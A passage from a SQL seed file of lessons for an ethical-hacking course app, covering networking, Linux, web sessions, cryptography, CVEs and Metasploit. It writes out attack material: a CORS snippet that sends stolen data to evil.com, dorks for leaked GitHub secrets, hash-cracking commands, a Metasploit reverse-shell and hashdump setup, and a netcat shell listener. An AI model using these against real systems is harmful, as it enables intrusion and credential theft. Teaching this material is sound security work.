-- HackPath — 120-Day Curriculum Seed Data (Part 2: Days 1–60)
-- All concept text is real cybersecurity educational content

insert into public.days (id, phase, title, concept, lab_url, lab_platform, xp_reward) values

-- ================================================================
-- PHASE 1: FOUNDATIONS (Days 1–20)
-- ================================================================

(1, 1, 'How the Internet Works', 
'## How the Internet Works

The internet is a global network of interconnected computers communicating via standardized protocols. Before hacking anything, you must deeply understand how data travels from your browser to a server and back.

**IP Addresses:** Every device on the internet has a unique IP address — a numerical label like `192.168.1.1`. IPv4 uses 32-bit addresses (4 billion total); IPv6 uses 128-bit. Your public IP is assigned by your ISP; private IPs (RFC 1918: 10.x.x.x, 172.16.x.x, 192.168.x.x) are used internally.

**DNS — The Internet''s Phonebook:** Domain names like `google.com` are mapped to IP addresses via DNS. When you type a URL, your computer queries a DNS resolver, which traverses the hierarchy: root servers → TLD servers (.com, .org) → authoritative name servers. This chain is a critical attack surface.

**TCP/IP Communication:** Data is broken into packets and routed across the internet using IP. TCP adds reliability with the three-way handshake: `SYN → SYN-ACK → ACK`. UDP is faster but connectionless — used by DNS and video streaming.

**HTTP/HTTPS:** Web traffic uses HTTP (Hypertext Transfer Protocol). Each request includes a method (GET, POST, PUT, DELETE), headers, and optionally a body. HTTPS encrypts traffic with TLS. As a hacker, you''ll intercept, modify, and replay these requests.

**Ports:** Services run on specific ports. Web servers listen on 80 (HTTP) and 443 (HTTPS). SSH is 22, FTP is 21, DNS is 53. Port scanning reveals what services are running on a target.

**Your First Mindset Shift:** Think of every system as a collection of services listening on ports, each with potential misconfigurations or vulnerabilities. Your goal is to find those weaknesses before the bad guys do.',
'https://tryhackme.com/room/howthewebworks', 'TryHackMe', 50),

(2, 1, 'The OSI Model Deep Dive',
'## The OSI Model Deep Dive

The OSI (Open Systems Interconnection) model is a conceptual framework dividing network communication into 7 layers. Security professionals use it to identify where attacks occur and which defenses apply.

**Layer 7 — Application:** Where user-facing protocols live: HTTP, HTTPS, FTP, DNS, SMTP, SSH. Most web attacks happen here (XSS, SQLi, SSRF).

**Layer 6 — Presentation:** Data encoding, encryption, compression. TLS operates between here and Layer 7. SSL stripping attacks target this layer.

**Layer 5 — Session:** Establishes, manages, and terminates sessions. Session hijacking exploits weaknesses here.

**Layer 4 — Transport:** TCP and UDP. SYN flood attacks target TCP''s three-way handshake. Port scanning works at this layer.

**Layer 3 — Network:** IP addressing and routing. IP spoofing, ICMP attacks, and routing manipulation happen here.

**Layer 2 — Data Link:** MAC addresses, ARP, Ethernet frames. ARP poisoning (man-in-the-middle) attacks happen at this layer. ARP maps IP addresses to MAC addresses — spoofing this lets you intercept traffic.

**Layer 1 — Physical:** Cables, Wi-Fi signals, hardware. Physical access attacks bypass all software controls.

**Attacker''s Perspective:** Attacks rarely stay at one layer. A phishing email (Layer 7) might deliver malware that exploits a network service (Layer 4) to pivot across segments (Layer 3). Understanding the full stack helps you trace attack paths and recommend layered defenses — defense in depth.',
'https://tryhackme.com/room/osimodelzi', 'TryHackMe', 50),

(3, 1, 'TCP/IP and Network Protocols',
'## TCP/IP and Network Protocols

**The TCP Three-Way Handshake:**
```
Client → Server: SYN (I want to connect)
Server → Client: SYN-ACK (Acknowledged, I''m listening)
Client → Server: ACK (Connection established)
```
A SYN flood attack sends millions of SYN packets without completing the handshake, exhausting server resources (DoS).

**Key Protocols You Must Know:**
- **ICMP:** Ping uses ICMP Echo Request/Reply to test connectivity. `ping 8.8.8.8`
- **ARP:** Maps IP to MAC on local networks. `arp -a` shows your table.
- **DHCP:** Automatically assigns IPs. Rogue DHCP servers are a real attack vector.
- **DNS:** UDP port 53 for queries, TCP for zone transfers. DNS is used in many attack chains.
- **SMTP/IMAP/POP3:** Email protocols. Misconfigured mail servers leak user info.
- **SMB:** Windows file sharing on ports 445/139. Source of EternalBlue/WannaCry.
- **SSH:** Encrypted remote shell on port 22. Weak keys and password auth are vulnerabilities.

**TCP Flags:** SYN, ACK, FIN, RST, PSH, URG. Nmap uses crafted flag combinations to fingerprint systems:
- SYN scan (-sS): Stealthy, doesn't complete handshake
- FIN scan (-sF): Sends FIN to probe closed ports
- Xmas scan (-sX): SYN+FIN+URG flags

**Wireshark Filters for Pentesters:**
```
tcp.flags.syn == 1 && tcp.flags.ack == 0   # SYN packets
http.request.method == "POST"               # POST requests
dns.qry.name contains "google"              # DNS queries
```

Practice capturing your own traffic while browsing — you''ll see the protocols in action.',
'https://tryhackme.com/room/introtonetworking', 'TryHackMe', 50),

(4, 1, 'DNS — From Resolution to Attack',
'## DNS — From Resolution to Attack

DNS is one of the most attacked protocols in cybersecurity — and one of the most overlooked.

**How DNS Resolution Works:**
1. Browser checks local cache
2. OS checks /etc/hosts
3. OS queries configured resolver (usually ISP or 8.8.8.8)
4. Resolver queries root servers → .com TLD → authoritative server
5. Answer is cached with TTL

**DNS Record Types:**
- **A:** Maps hostname to IPv4
- **AAAA:** Maps hostname to IPv6
- **CNAME:** Alias to another hostname
- **MX:** Mail server for domain
- **TXT:** Arbitrary text — often holds SPF, DKIM records
- **NS:** Authoritative name servers
- **SOA:** Zone administrative info

**DNS Attacks:**
- **DNS Zone Transfer:** Misconfigured DNS servers reveal all records: `dig axfr @dns.target.com target.com`
- **DNS Cache Poisoning:** Inject false records into a resolver''s cache to redirect users
- **DNS Tunneling:** Exfiltrate data by encoding it in DNS queries/responses
- **Subdomain Takeover:** Claim an abandoned subdomain that still has a DNS record pointing to it

**Reconnaissance with DNS:**
```bash
nslookup target.com
dig target.com MX
dig target.com TXT
dnsrecon -d target.com -t axfr
```

**Subdomain discovery via Certificate Transparency:**
`https://crt.sh/?q=%.target.com`

DNS reconnaissance is the foundation of all external pentesting. Always enumerate DNS records before scanning ports.',
'https://tryhackme.com/room/dnsindetail', 'TryHackMe', 50),

(5, 1, 'Subnetting and CIDR Notation',
'## Subnetting and CIDR Notation

Understanding subnetting is critical for network pentesting — it determines which hosts are reachable and how to scope a scan.

**IPv4 Address Classes:**
- **Class A:** 1.0.0.0 – 126.0.0.0 (large organizations)
- **Class B:** 128.0.0.0 – 191.255.0.0 (medium networks)
- **Class C:** 192.0.0.0 – 223.255.255.0 (small networks)

**Private IP Ranges (RFC 1918):**
- 10.0.0.0/8 (10.x.x.x)
- 172.16.0.0/12 (172.16.x.x – 172.31.x.x)
- 192.168.0.0/16 (192.168.x.x)

**CIDR Notation:** `/24` means 24 bits are network bits, leaving 8 bits for hosts = 256 addresses (254 usable).

**Quick Reference:**
| CIDR | Subnet Mask     | Hosts    |
|------|-----------------|----------|
| /8   | 255.0.0.0       | 16M      |
| /16  | 255.255.0.0     | 65,534   |
| /24  | 255.255.255.0   | 254      |
| /25  | 255.255.255.128 | 126      |
| /30  | 255.255.255.252 | 2        |

**For Pentesting:** When given scope `192.168.1.0/24`, you have 254 targets. Nmap can scan entire subnets: `nmap -sn 192.168.1.0/24`

**Broadcast and Network Addresses:** First address = network (.0), last = broadcast (.255). Never use these for hosts.

**VLSM:** Variable Length Subnet Masking allows different subnets in the same network. Modern networks use this to efficiently allocate IPs.

Practice calculating subnets until it becomes second nature — you''ll need it when mapping internal networks during engagements.',
'https://tryhackme.com/room/subnetting', 'TryHackMe', 50),

(6, 1, 'Packet Analysis with Wireshark',
'## Packet Analysis with Wireshark

Wireshark is the world''s most used network protocol analyzer. As a pentester, you use it to understand traffic, capture credentials, and analyze malware behavior.

**Installation:** Available at wireshark.org. On Kali: `sudo apt install wireshark`

**Capture Filters (BPF syntax — set before capturing):**
```
host 192.168.1.1         # Traffic to/from specific host
port 80                  # HTTP traffic only
tcp and port 443         # HTTPS
not arp                  # Exclude ARP noise
```

**Display Filters (set after capturing):**
```
http.request.method == "GET"
ip.src == 192.168.1.100
tcp.port == 22
http.response.code == 200
ftp.request.command == "PASS"   # FTP passwords in cleartext!
```

**Protocol Dissection:** Right-click any packet → Follow → TCP/HTTP/TLS Stream to see the full conversation.

**Finding Credentials:** Protocols that transmit credentials in cleartext:
- HTTP (Basic Auth, form POST)
- FTP
- Telnet
- SMTP (AUTH PLAIN)
- POP3/IMAP without TLS

**Detecting Scanning:** SYN packets to many ports from one source = Nmap scan.

**Analyzing Malware Traffic:** Look for unusual DNS queries, beaconing patterns (regular intervals), and large data transfers.

**tshark (CLI):** Wireshark on the command line — great for automated capture:
```bash
tshark -i eth0 -w capture.pcap
tshark -r capture.pcap -Y "http.request" -T fields -e http.host
```

Capture your own network traffic today. You''ll see DNS, TCP handshakes, HTTP requests — the internet laid bare.',
'https://tryhackme.com/room/wireshark', 'TryHackMe', 50),

(7, 1, 'Linux Fundamentals — Part 1',
'## Linux Fundamentals — Part 1

Linux is the operating system of servers, routers, firewalls, and IoT devices — which means almost everything you hack runs Linux. Kali Linux is your primary attack platform.

**Filesystem Hierarchy:**
```
/           — Root of everything
/bin        — Essential binaries (ls, cp, mv)
/etc        — Configuration files (passwd, shadow, hosts)
/home       — User home directories
/var        — Variable data (logs, web files)
/tmp        — Temp files (world-writable — useful for pentesters)
/proc       — Virtual filesystem: running processes info
/dev        — Device files
/opt        — Optional third-party software
```

**Essential Commands:**
```bash
ls -la              # List all files with permissions
cd /etc             # Change directory
cat /etc/passwd     # Read a file
grep "root" /etc/passwd   # Search within file
find / -name "*.conf" 2>/dev/null  # Find config files
ps aux              # All running processes
netstat -tulnp      # Listening ports
id                  # Current user and groups
whoami              # Current username
uname -a            # Kernel and OS info
```

**File Operations:**
```bash
cp file.txt /tmp/   # Copy
mv file.txt newname # Move/rename
rm -rf /tmp/test    # Remove recursively (CAREFUL)
mkdir -p /opt/tools # Create directories
chmod 755 script.sh # Set permissions
chown user:group file # Change ownership
```

**I/O Redirection:**
```bash
command > file.txt     # Redirect stdout
command >> file.txt    # Append stdout
command 2>/dev/null    # Discard errors
command | grep pattern # Pipe to grep
```

Start with TryHackMe''s Linux Fundamentals series — complete all three rooms before tomorrow.',
'https://tryhackme.com/room/linuxfundamentals1', 'TryHackMe', 50),

(8, 1, 'Linux Fundamentals — Part 2',
'## Linux Fundamentals — Part 2: Permissions and Users

**User and Group Model:**
Every file has an owner (user) and group. Permissions are set for three categories:
- **Owner (u):** The file''s creator
- **Group (g):** The file''s assigned group
- **Others (o):** Everyone else

**Permission Notation:**
```
-rwxr-xr-- 1 root shadow 1234 Jan 1 /etc/shadow
 ↑↑↑↑↑↑↑↑↑
 ||||||||| 
 ||||||---  Others: r-- (read only)
 |||---     Group: r-x (read + execute)
 ---        Owner: rwx (full)
 |
 - = file, d = directory, l = symlink
```

**chmod — Change Permissions:**
```bash
chmod 755 script.sh   # rwxr-xr-x
chmod +x script.sh    # Add execute for all
chmod u+s binary      # Set SUID bit (runs as owner)
chmod o-w file        # Remove write for others
```

**Special Permission Bits (Critical for PrivEsc):**
- **SUID (4000):** File runs as its owner. If `root` owns it and SUID is set → runs as root!
  `find / -perm -4000 2>/dev/null` — enumerate SUID binaries
- **SGID (2000):** Runs as file''s group
- **Sticky bit (1000):** Only owner can delete (used on /tmp)

**sudo:** Run commands as another user (usually root). `sudo -l` lists what you can run — this is GOLD for privilege escalation.

**User Management:**
```bash
cat /etc/passwd    # All users (format: user:x:uid:gid:info:home:shell)
cat /etc/shadow    # Password hashes (root read only)
sudo useradd -m newuser
sudo passwd newuser
su - newuser       # Switch user
```

**Finding PrivEsc Vectors:**
```bash
sudo -l                              # Sudo rights
find / -perm -4000 2>/dev/null       # SUID files  
cat /etc/crontab                     # Cron jobs
env                                  # Environment variables
```

These commands will become muscle memory. You''ll run them on every machine you compromise.',
'https://tryhackme.com/room/linuxfundamentals2', 'TryHackMe', 50),

(9, 1, 'Linux Networking and Services',
'## Linux Networking and Services

**Network Configuration Commands:**
```bash
ip addr show          # All network interfaces and IPs
ip route show         # Routing table
ifconfig              # Legacy: interface config
iwconfig              # Wireless interface info
ss -tulnp             # Listening sockets (modern netstat)
netstat -tulnp        # Legacy: listening ports
cat /etc/resolv.conf  # DNS configuration
```

**Key Files for Network Config:**
- `/etc/hosts` — Local hostname to IP mapping (can be poisoned)
- `/etc/resolv.conf` — DNS server config
- `/etc/network/interfaces` (Debian) — Network interface config
- `/etc/sysconfig/network-scripts/` (RHEL) — NIC configuration

**Connecting and Scanning:**
```bash
ping -c 4 8.8.8.8           # Test connectivity
traceroute google.com        # Trace route to host
curl -I https://example.com  # HTTP headers only
wget https://example.com/file # Download file
nc -zv 10.0.0.1 22           # Test if port 22 is open
ssh user@10.0.0.1            # Connect via SSH
scp file.txt user@10.0.0.1:/tmp/ # Copy file via SSH
```

**Service Management (systemd):**
```bash
systemctl status apache2     # Check service status
systemctl start apache2      # Start service
systemctl enable apache2     # Start on boot
systemctl stop nginx         # Stop service
journalctl -u apache2 -f     # Follow service logs
```

**Common Services and Their Ports:**
| Service  | Port | Protocol |
|----------|------|----------|
| SSH      | 22   | TCP |
| HTTP     | 80   | TCP |
| HTTPS    | 443  | TCP |
| FTP      | 21   | TCP |
| Telnet   | 23   | TCP |
| SMTP     | 25   | TCP |
| DNS      | 53   | UDP/TCP |
| SMB      | 445  | TCP |
| MySQL    | 3306 | TCP |
| RDP      | 3389 | TCP |

**Firewall with iptables/ufw:**
```bash
ufw status                # Show firewall rules
ufw allow 22/tcp          # Allow SSH
iptables -L -n -v         # Detailed iptables rules
```

Understanding what services are running — and on what ports — is the foundation of enumeration.',
'https://tryhackme.com/room/linuxfundamentals3', 'TryHackMe', 50),

(10, 1, 'Bash Scripting for Hackers',
'## Bash Scripting for Hackers

Automation separates efficient pentesters from slow ones. Bash scripting lets you automate reconnaissance, parse tool output, and build custom exploits.

**Script Structure:**
```bash
#!/bin/bash
# Always start with shebang

# Variables
TARGET="192.168.1.0/24"
OUTPUT_DIR="/tmp/scan"

# Create directory
mkdir -p "$OUTPUT_DIR"

echo "[*] Starting scan of $TARGET"
```

**Control Flow:**
```bash
# If statements
if [ -f /etc/passwd ]; then
    echo "File exists"
fi

# For loops
for ip in 192.168.1.{1..254}; do
    ping -c 1 -W 1 "$ip" &>/dev/null && echo "$ip is up"
done

# While loops
while read line; do
    echo "Processing: $line"
done < wordlist.txt
```

**Functions:**
```bash
scan_host() {
    local host="$1"
    nmap -sV -T4 "$host" -o "/tmp/$host.txt"
}

scan_host 192.168.1.1
```

**Practical Hacking Scripts:**

*Ping sweep (host discovery):*
```bash
#!/bin/bash
for i in $(seq 1 254); do
    ping -c 1 -W 1 "192.168.1.$i" &>/dev/null && echo "192.168.1.$i ALIVE" &
done
wait
```

*Port scanner (without Nmap):*
```bash
#!/bin/bash
HOST=$1
for port in 21 22 23 25 53 80 443 445 3306 3389; do
    (echo >/dev/tcp/$HOST/$port) 2>/dev/null && echo "$port OPEN"
done
```

*Parse Nmap output for open ports:*
```bash
grep -oP "\d+/tcp\s+open" scan.nmap | awk ''{print $1}''
```

**Text Processing (Essential):**
```bash
grep "error" logfile.txt          # Search pattern
awk ''{print $1, $3}'' file.txt   # Print columns 1 and 3
sed ''s/foo/bar/g'' file.txt       # Replace text
cut -d: -f1 /etc/passwd           # Get usernames
sort -u list.txt                  # Sort and deduplicate
wc -l file.txt                    # Count lines
```

Write a script today that pings a subnet and outputs live hosts to a file. That''s your first automation tool.',
'https://overthewire.org/wargames/bandit', 'OverTheWire', 50),

(11, 1, 'Git and Version Control for Security',
'## Git and Version Control for Security Research

**Why Hackers Need Git:**
- Clone exploit repositories from GitHub
- Version-control your tools and scripts
- Find secrets accidentally committed to repos
- Contribute to open-source security tools

**Essential Git Commands:**
```bash
git clone https://github.com/user/repo  # Download repo
git pull                                 # Update local copy
git status                              # See changes
git log --oneline                       # Commit history
git diff HEAD~1                         # Compare with previous commit
git grep "password"                     # Search repo contents
```

**Finding Secrets in Git History:**
```bash
# Search all commits for secrets
git log --all --full-history -- "*.env"
git log -p | grep -i "password\|secret\|api_key"

# Tools for automated secret discovery
# truffleHog: https://github.com/trufflesecurity/trufflehog
# git-secrets: https://github.com/awslabs/git-secrets
```

**Google Dork for GitHub Secrets:**
```
site:github.com filename:.env "DB_PASSWORD"
site:github.com filename:config.php "password"
site:github.com "api_key" "secret"
```

**Creating Your Research Repository:**
```bash
mkdir my-tools && cd my-tools
git init
echo "# My Hacking Tools" > README.md
git add .
git commit -m "Initial commit"
```

**Useful Security Repos to Clone Today:**
- `SecLists` — Wordlists for everything: `git clone https://github.com/danielmiessler/SecLists`
- `PayloadsAllTheThings` — Attack payloads
- `PEASS-ng` — Privilege escalation scripts

**GitHub Recon Tips:**
- Search for `"target.com" password` on GitHub
- Check company employee profiles for public repos
- Look at commit history for deleted secrets
- Use GitHub''s API to enumerate org members and repos

SecLists is one of the most important downloads in your pentesting toolkit. Clone it now.',
'https://tryhackme.com/room/googledorking', 'TryHackMe', 50),

(12, 1, 'Setting Up Your Hacking Lab',
'## Setting Up Your Ethical Hacking Lab

A proper lab lets you practice attacks legally and safely. Here is exactly how to set it up.

**Option 1 — Kali Linux VM (Recommended):**
1. Download VirtualBox (free): virtualbox.org
2. Download Kali Linux ISO: kali.org/get-kali
3. Create VM: 4GB RAM, 50GB disk, 2 CPUs
4. Install Kali. Default credentials: `kali/kali`
5. `sudo apt update && sudo apt full-upgrade -y`

**Option 2 — WSL2 on Windows:**
```powershell
wsl --install -d kali-linux
```
Install kali-win-kex for a desktop environment.

**Essential Tools Pre-installed in Kali:**
Nmap, Metasploit, Burp Suite, Wireshark, Gobuster, Hydra, SQLMap, John, Hashcat, Netcat, Nikto

**Install Additional Tools:**
```bash
sudo apt install -y ffuf feroxbuster seclists bloodhound neo4j
pip3 install impacket
```

**Target Machines:**
1. **TryHackMe:** Browser-based VMs — no local setup needed
2. **HackTheBox:** VPN access to real machines
3. **Metasploitable2:** Intentionally vulnerable VM
   ```bash
   # Download from SourceForge
   # Set network to Host-Only in VirtualBox
   ```
4. **DVWA (Damn Vulnerable Web Application):**
   ```bash
   sudo apt install dvwa
   # Or run with Docker:
   docker run --rm -p 80:80 vulnerables/web-dvwa
   ```

**Network Setup:**
- Set target VMs to "Host-Only" networking — isolated from internet
- Set Kali to same Host-Only adapter to reach targets
- Kali also needs NAT for internet access — add second adapter

**Must-Have Config:**
```bash
# /etc/hosts — add shortcuts
10.10.10.1  target.htb
# Terminal multiplexer
sudo apt install tmux
# Add to .zshrc
export PATH="$PATH:/opt/tools"
```

Your lab is your gym. Build it properly and keep it updated.',
'https://tryhackme.com/room/kalilinux', 'TryHackMe', 50),

(13, 1, 'HTTP Deep Dive for Hackers',
'## HTTP Deep Dive for Hackers

HTTP (HyperText Transfer Protocol) is the language of the web. Every web attack — XSS, SQLi, CSRF, SSRF — is delivered via HTTP. Master it completely.

**HTTP Request Structure:**
```
POST /login HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Cookie: session=abc123
User-Agent: Mozilla/5.0
Connection: keep-alive

username=admin&password=test
```

**HTTP Response Structure:**
```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session=xyz789; HttpOnly; Secure
X-Frame-Options: DENY
Content-Length: 5820

<!DOCTYPE html>...
```

**HTTP Methods:**
- `GET` — Retrieve resource (no body)
- `POST` — Submit data (has body)
- `PUT` — Replace resource
- `PATCH` — Partial update
- `DELETE` — Remove resource
- `OPTIONS` — Check allowed methods (CORS preflight)
- `HEAD` — Like GET but no body (good for recon)
- `TRACE` — Echoes request (XST attacks — mostly historical)

**Status Codes That Matter:**
| Code | Meaning | Hacker relevance |
|------|---------|-----------------|
| 200  | OK | Success |
| 301/302 | Redirect | Follow for recon |
| 401  | Unauthorized | Auth required |
| 403  | Forbidden | Auth bypass target |
| 404  | Not Found | Dirbusting baseline |
| 405  | Method Not Allowed | Try other methods |
| 500  | Server Error | Possible injection |
| 302 after POST | Redirect | Check for CSRF |

**Security Headers:**
- `X-Frame-Options: DENY` — Prevents clickjacking
- `Content-Security-Policy` — Controls script sources (XSS mitigation)
- `Strict-Transport-Security` — Forces HTTPS
- `X-Content-Type-Options: nosniff` — Prevents MIME sniffing
- Missing headers = vulnerability findings!

Use `curl -I https://target.com` to check headers quickly.',
'https://tryhackme.com/room/http', 'TryHackMe', 50),

(14, 1, 'Web Authentication and Sessions',
'## Web Authentication and Sessions

Authentication is the #1 source of web vulnerabilities. Understanding how it works is prerequisite to breaking it.

**Session-Based Auth (Traditional):**
1. User submits credentials
2. Server validates, creates session in database
3. Server sends `Set-Cookie: PHPSESSID=abc123`
4. Browser sends cookie on every request
5. Server looks up session → identifies user

**Attack vectors:** Session fixation, session hijacking (stealing cookie), brute-forcing session IDs.

**JWT (JSON Web Tokens):**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.  ← Header (base64)
eyJ1c2VySWQiOjEsInJvbGUiOiJ1c2VyIn0.   ← Payload (base64)
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c  ← Signature (HMAC)
```

**JWT Attacks:**
- **Algorithm confusion:** Change `alg` from `HS256` to `none` → no signature required
- **Weak secret:** Brute-force HMAC secret with `hashcat -a 0 -m 16500 token.txt wordlist.txt`
- **Key confusion:** RS256 → HS256 attack using public key as secret

**OAuth 2.0 Flows:** Authorization Code (most secure), Implicit (deprecated), Client Credentials, Resource Owner Password. OAuth misconfigurations are common in bug bounties.

**API Keys:** Sent in headers (`X-API-Key`), query params (`?api_key=`), or Basic Auth. Often found in JS files, git history, and mobile app decompilation.

**Cookie Security Flags:**
- `HttpOnly` — JS can''t read it (prevents XSS cookie theft)
- `Secure` — Only sent over HTTPS
- `SameSite=Strict/Lax/None` — CSRF protection

**Identifying Auth Mechanisms:**
```bash
# Check for JWT in response
curl -s https://api.target.com/login -d ''{"user":"test","pass":"test"}'' | jq .token
# Decode JWT
echo "eyJ..." | base64 -d
```

Tomorrow you''ll start breaking these authentication systems.',
'https://portswigger.net/web-security/authentication', 'PortSwigger', 50),

(15, 1, 'Web Technologies: Cookies, CORS, CSP',
'## Web Technologies: Cookies, CORS, and CSP

These three mechanisms control security between origins and how browsers handle sensitive data.

**Cookies In Depth:**
```http
Set-Cookie: session=abc123; 
            Domain=.example.com; 
            Path=/; 
            Expires=Thu, 01 Jan 2026 00:00:00 GMT; 
            HttpOnly; 
            Secure; 
            SameSite=Lax
```

Cookie scoping: `Domain=.example.com` means cookie is sent to all subdomains. An XSS on `sub.example.com` can steal cookies scoped to `.example.com`.

**CORS (Cross-Origin Resource Sharing):**
Browsers block cross-origin AJAX by default (Same-Origin Policy). CORS headers let servers allow it:
```
Access-Control-Allow-Origin: https://trusted-site.com
Access-Control-Allow-Credentials: true
```

**CORS Misconfiguration Attack:**
If server reflects origin: `Access-Control-Allow-Origin: *` or echoes your origin + `Allow-Credentials: true`, you can steal data:
```javascript
fetch(''https://vulnerable.com/api/data'', {credentials: ''include''})
  .then(r => r.text())
  .then(d => fetch(''https://evil.com/?steal=''+d))
```

**Content Security Policy (CSP):**
CSP headers control which scripts can execute:
```
Content-Security-Policy: default-src ''self''; script-src ''self'' https://cdn.example.com
```

**CSP Bypasses:**
- `unsafe-inline` allowed → inline `<script>` works
- Whitelisted CDN with user content (e.g., Google APIs with jsonp)
- `script-src *` → any script source allowed

**SameSite Cookie Attribute:**
- `Strict` — Never sent cross-site
- `Lax` — Sent on top-level navigation GET requests
- `None` — Sent cross-site (requires `Secure`)

**For Bug Bounty:** Check CORS on every API endpoint. A misconfigured CORS policy + auth endpoint = critical finding.',
'https://portswigger.net/web-security/cors', 'PortSwigger', 50),

(16, 1, 'Introduction to Cryptography',
'## Introduction to Cryptography for Hackers

You don''t need to be a mathematician, but you must understand cryptographic primitives to attack and defend them.

**Symmetric Encryption:** Same key encrypts and decrypts.
- **AES (Advanced Encryption Standard):** 128/192/256-bit keys. Block cipher. Used everywhere.
- **DES/3DES:** Deprecated — DES brute-forced easily (56-bit key). Never use.
- **Modes of Operation:** ECB (broken — patterns visible), CBC (common), GCM (authenticated — best)
- **ECB Penguin Attack:** ECB encrypts identical blocks identically → reveals patterns

**Asymmetric Encryption:** Key pair — public key encrypts, private key decrypts.
- **RSA:** Based on prime factorization. 2048-bit minimum. Common attacks: weak padding (PKCS#1 v1.5), small exponent.
- **ECDSA/ECDH:** Elliptic curve variants — same security with smaller keys.

**Hashing:** One-way function. Same input always produces same output. Cannot reverse (without brute force).
- **MD5:** 128-bit. Broken — collisions found. Never use for security.
- **SHA-1:** 160-bit. Deprecated.
- **SHA-256/SHA-3:** Secure. Use these.
- **bcrypt/scrypt/Argon2:** Password hashing — includes salt and work factor.

**Password Cracking:**
```bash
# Identify hash type
hashid ''5f4dcc3b5aa765d61d8327deb882cf99''  # MD5 of "password"

# Crack with hashcat
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt  # MD5
hashcat -m 3200 -a 0 hash.txt wordlist.txt                    # bcrypt

# John the Ripper
john --format=raw-md5 --wordlist=rockyou.txt hash.txt
```

**Encoding vs Encryption:**
- **Base64:** ENCODING — not encryption. Anyone can decode. `echo "secret" | base64`
- **URL Encoding:** `%20` = space. `%3C` = `<` (important for WAF bypass)
- **Hex:** `41 42 43` = `ABC`

**For Pentesting:** Always check if "encrypted" values are just base64 encoded. This mistake is shockingly common.',
'https://tryhackme.com/room/cryptographyintro', 'TryHackMe', 50),

(17, 1, 'Understanding CVEs and Vulnerability Databases',
'## Understanding CVEs and Vulnerability Databases

**CVE — Common Vulnerabilities and Exposures:**
Every publicly known vulnerability gets a CVE identifier: `CVE-YEAR-NUMBER` (e.g., `CVE-2021-44228` is Log4Shell).

**CVSS — Common Vulnerability Scoring System:**
Rates severity from 0.0 to 10.0:
| Score | Severity |
|-------|----------|
| 0.0   | None |
| 0.1–3.9 | Low |
| 4.0–6.9 | Medium |
| 7.0–8.9 | High |
| 9.0–10.0 | Critical |

CVSS v3.1 Base Score components:
- **Attack Vector:** Network/Adjacent/Local/Physical
- **Attack Complexity:** Low/High
- **Privileges Required:** None/Low/High
- **User Interaction:** None/Required
- **Scope:** Unchanged/Changed
- **Impact:** Confidentiality/Integrity/Availability (None/Low/High each)

**Where to Find Vulnerabilities:**
- **NVD (nvd.nist.gov):** Official US CVE database
- **Exploit-DB (exploit-db.com):** Public exploits with PoC code
- **Vulhub (github.com/vulhub/vulhub):** Docker images for testing known CVEs
- **Rapid7 DB:** Metasploit module references
- **Packet Storm:** Security advisories and exploits

**Using searchsploit (local Exploit-DB search):**
```bash
searchsploit apache 2.4       # Search by service/version
searchsploit -x 47180         # View exploit without copying
searchsploit -m 47180         # Copy exploit to current dir
searchsploit --update         # Update local database
```

**Researching a CVE Workflow:**
1. Identify service version (Nmap -sV)
2. Search CVEs for that version in NVD
3. Find PoC in Exploit-DB or GitHub
4. Check if Metasploit module exists
5. Test in controlled environment first

**Famous CVEs to Know:**
- CVE-2017-0144: EternalBlue (SMBv1) — WannaCry
- CVE-2021-44228: Log4Shell (JNDI injection in Log4j)
- CVE-2014-0160: Heartbleed (OpenSSL memory disclosure)
- CVE-2021-34527: PrintNightmare (Windows Print Spooler)

Understanding CVEs is essential for real-world pentesting and bug bounty scoping.',
'https://tryhackme.com/room/vulnerabilities101', 'TryHackMe', 50),

(18, 1, 'Introduction to Metasploit',
'## Introduction to Metasploit Framework

Metasploit is the world''s most widely used penetration testing framework with thousands of modules for exploiting, post-exploitation, and auxiliary tasks.

**Core Concepts:**
- **Exploit:** Code that takes advantage of a vulnerability
- **Payload:** Code that runs AFTER successful exploitation (e.g., reverse shell)
- **Module:** Any piece of code Metasploit can execute
- **Session:** An active connection to a compromised machine
- **Meterpreter:** Advanced payload that provides a powerful shell

**Starting Metasploit:**
```bash
sudo msfdb init   # Initialize the database
msfconsole        # Start Metasploit
```

**Essential Commands:**
```bash
search apache         # Search for modules
use exploit/multi/handler   # Select a module
info                  # Show module information
show options          # Required settings
set RHOSTS 10.0.0.1  # Set target IP
set LHOST 10.0.0.2   # Set your IP (for reverse shells)
set PAYLOAD linux/x64/meterpreter/reverse_tcp
run                   # Execute
```

**Meterpreter Commands:**
```bash
sysinfo               # System information
getuid                # Current user
ps                    # Running processes
migrate 1234          # Migrate to process 1234
shell                 # Drop to system shell
upload file.exe /tmp/ # Upload file
download /etc/passwd  # Download file
hashdump              # Dump password hashes
run post/linux/gather/enum_system  # Enumerate system
```

**Common Module Types:**
```
exploit/        — Vulnerabilities to exploit
auxiliary/      — Scanning, fuzzing, brute-forcing
post/           — Post-exploitation modules
payload/        — Code to execute on target
encoder/        — Obfuscate payloads (AV evasion)
```

**Practice Setup:** Use Metasploitable2 or TryHackMe rooms. Never run exploits against systems you don''t own.',
'https://tryhackme.com/room/metasploitintro', 'TryHackMe', 50),

(19, 1, 'Networking Tools and Recon Prep',
'## Networking Tools and Recon Preparation

**Essential Network Reconnaissance Tools:**

**ping — Live Host Detection:**
```bash
ping -c 4 192.168.1.1          # Send 4 ICMP packets
ping -i 0.2 -c 100 10.0.0.1    # Fast ping (0.2s interval)
```
Note: Many hosts block ICMP. Alive ≠ pingable.

**traceroute / tracert — Path Discovery:**
```bash
traceroute 8.8.8.8              # Linux
tracert 8.8.8.8                 # Windows
mtr 8.8.8.8                     # Combined ping+trace
```
Reveals network hops — useful for mapping infrastructure.

**netcat — The Swiss Army Knife:**
```bash
# Port scanner
nc -zv 10.0.0.1 1-1000

# Listener (catch reverse shells)
nc -lvnp 4444

# File transfer
nc -lvnp 9999 > received.txt        # Receiver
nc 10.0.0.1 9999 < file.txt         # Sender

# Banner grabbing
echo "" | nc -w1 10.0.0.1 80
```

**curl — HTTP Swiss Army Knife:**
```bash
curl -v https://target.com             # Verbose request
curl -X POST -d "user=admin&pass=test" https://target.com/login
curl -H "Authorization: Bearer token" https://api.target.com
curl --cookie "session=abc" https://target.com
curl -o output.html https://target.com  # Save response
